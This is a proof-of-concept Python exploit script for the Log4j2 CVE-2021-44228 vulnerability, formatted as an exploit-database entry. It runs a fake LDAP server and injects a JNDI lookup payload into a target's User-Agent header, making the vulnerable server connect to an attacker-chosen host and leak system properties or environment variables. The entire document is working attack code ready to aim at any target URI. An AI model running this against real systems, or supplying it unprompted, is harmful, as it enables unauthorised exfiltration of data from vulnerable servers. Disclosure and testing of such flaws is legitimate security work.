# Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure
# Date: 12/12/2021
# Exploit Author: leonjza
# Vendor Homepage: https://logging.apache.org/log4j/2.x/
# Version: <= 2.14.1
# CVE: CVE-2021-44228

#!/usr/bin/env python3

# Pure python ENV variable leak PoC for CVE-2021-44228
# Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284
#
# 2021 @leonjza

import argparse
import socketserver
import threading
import time

import requests

LDAP_HEADER = b'\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a'

class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        print(f' [INFO] New connection from {self.client_address[0]}')

        sock = self.request
        sock.recv(1024)
        sock.sendall(LDAP_HEADER)

        data = sock.recv(1024)
        data = data[9:]  # Strip header

        # Decode and extract leaked information from received data
        data = data.decode(errors='ignore').split('\n')[0]
        print(f' [INFO] Extracted value: {data}')


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass


def main():
    parser = argparse.ArgumentParser(description='''A simple Log4j <= 2.14 
information disclosure PoC (ref: https://twitter.com/Black2Fan/status/1470281005038817284)''')
    
    parser.add_argument('--target', '-t', required=True, help='Target URI')
    parser.add_argument('--listen-host', default='0.0.0.0', help='Exploit server host to listen on (default: 0.0.0.0)')
    parser.add_argument('--listen-port', '-lp', default=8888, type=int, help='Exploit server port to listen on (default: 8888)')
    parser.add_argument('--exploit-host', '-eh', required=True, help='Host where the exploit server is reachable')
    parser.add_argument('--leak', '-l', default='${sys:java.version}', help='Value to leak (default: ${sys:java.version})')

    args = parser.parse_args()

    print(f' [INFO] Starting server on {args.listen_host}:{args.listen_port}')
    server = ThreadedTCPServer((args.listen_host, args.listen_port), ThreadedTCPRequestHandler)

    # Start server in a separate thread
    serv_thread = threading.Thread(target=server.serve_forever)
    serv_thread.daemon = True
    serv_thread.start()
    time.sleep(1)  # Allow server to start
    print(f' [INFO] Server started')

    # Create the payload
    payload = f'${{jndi:ldap://{args.exploit_host}:{args.listen_port}/{args.leak}}}'
    print(f' [INFO] Sending exploit payload {payload} to {args.target}')

    try:
        # Send the GET request with the payload
        r = requests.get(args.target, headers={'User-Agent': payload})
        # print(f' [INFO] Response status code: {r.status_code}')
        # print(f' [INFO] Response: {r.text}')
    except Exception as e:
        print(f' [ERROR] Failed to make request: {e}')
    finally:
        # Shutdown server cleanly
        print(f' [INFO] Shutting down server')
        server.shutdown()
        server.server_close()


if __name__ == '__main__':
    main()